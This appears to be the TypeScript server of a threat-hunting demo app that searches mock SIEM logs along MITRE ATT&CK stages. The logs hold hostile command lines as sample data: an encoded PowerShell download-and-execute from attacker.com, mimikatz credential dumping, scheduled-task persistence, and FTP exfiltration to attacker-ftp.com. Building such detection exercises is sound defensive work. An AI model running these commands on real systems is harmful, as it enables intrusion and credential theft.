import express from "express";
import { createServer as createViteServer } from "vite";
import path from "path";
import cors from "cors";
import fs from "fs";

// Mock SIEM Logs (ECS Compliant)
const MOCK_LOGS = [
  // Initial Access: Phishing (T1566.001)
  {
    "@timestamp": "2026-03-22T08:00:00Z",
    "host": { "name": "WKSTN-01" },
    "user": { "name": "jdoe" },
    "process": { "name": "outlook.exe", "command_line": "outlook.exe /open Invoice.doc" },
    "event": { "category": "file", "action": "creation" }
  },
  // Execution: PowerShell (T1059.001)
  {
    "@timestamp": "2026-03-22T08:05:00Z",
    "host": { "name": "WKSTN-01" },
    "user": { "name": "jdoe" },
    "process": {
      "name": "powershell.exe",
      "command_line": "powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC4AYwBvAG0ALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA"
    },
    "event": { "category": "process", "action": "start" }
  },
  // Persistence: Scheduled Task (T1053.005)
  {
    "@timestamp": "2026-03-22T08:10:00Z",
    "host": { "name": "WKSTN-01" },
    "user": { "name": "jdoe" },
    "process": {
      "name": "schtasks.exe",
      "command_line": "schtasks.exe /create /tn \"UpdateCheck\" /tr \"C:\\Users\\jdoe\\AppData\\Local\\Temp\\shell.exe\" /sc daily /st 12:00"
    },
    "event": { "category": "process", "action": "start" }
  },
  // Discovery: Account Discovery (T1087.001)
  {
    "@timestamp": "2026-03-22T08:15:00Z",
    "host": { "name": "WKSTN-01" },
    "user": { "name": "jdoe" },
    "process": { "name": "net.exe", "command_line": "net user /domain" },
    "event": { "category": "process", "action": "start" }
  },
  // Credential Access: LSASS Dump (T1003.001)
  {
    "@timestamp": "2026-03-22T08:20:00Z",
    "host": { "name": "WKSTN-01" },
    "user": { "name": "jdoe" },
    "process": {
      "name": "mimikatz.exe",
      "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
    },
    "event": { "category": "process", "action": "start" }
  },
  // Lateral Movement: RDP (T1021.001)
  {
    "@timestamp": "2026-03-22T08:30:00Z",
    "host": { "name": "WKSTN-01" },
    "user": { "name": "jdoe" },
    "process": { "name": "mstsc.exe", "command_line": "mstsc.exe /v:DC-01" },
    "event": { "category": "network", "action": "connection" }
  },
  // Exfiltration: FTP (T1048)
  {
    "@timestamp": "2026-03-22T09:00:00Z",
    "host": { "name": "DC-01" },
    "user": { "name": "admin" },
    "process": { "name": "ftp.exe", "command_line": "ftp.exe -s:commands.txt attacker-ftp.com" },
    "event": { "category": "network", "action": "connection" }
  }
];

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json());

  // Scenario Vault
  const scenarios = JSON.parse(fs.readFileSync("./scenarios.json", "utf-8"));

  // Mock ES Search
  const mockSearch = (query: string) => {
    // Simple mock search: check if query keywords exist in command_line or process name
    const keywords = query.toLowerCase().replace(/["':]/g, " ").split(/\s+/).filter(k => k.length > 2 && k !== "or" && k !== "and");
    return MOCK_LOGS.filter(log => {
      const logStr = JSON.stringify(log).toLowerCase();
      return keywords.some(k => logStr.includes(k));
    });
  };

  // API: Get Scenario Vault
  app.get("/api/vault", (req, res) => {
    res.json(scenarios);
  });

  // API: Recursive Hunt
  app.post("/api/hunt", async (req, res) => {
    const { mitre_id, initial_hits } = req.body;
    const context = { initial_event: initial_hits, follow_ups: [] as any[] };

    if (scenarios[mitre_id]) {
      for (const stage of scenarios[mitre_id].next_stages) {
        console.log(`[*] Pivoting to: ${stage.stage}`);
        const hits = mockSearch(stage.query);
        if (hits.length > 0) {
          context.follow_ups.push({ stage: stage.stage, technique: stage.technique, hits });
        }
      }
    }
    res.json(context);
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
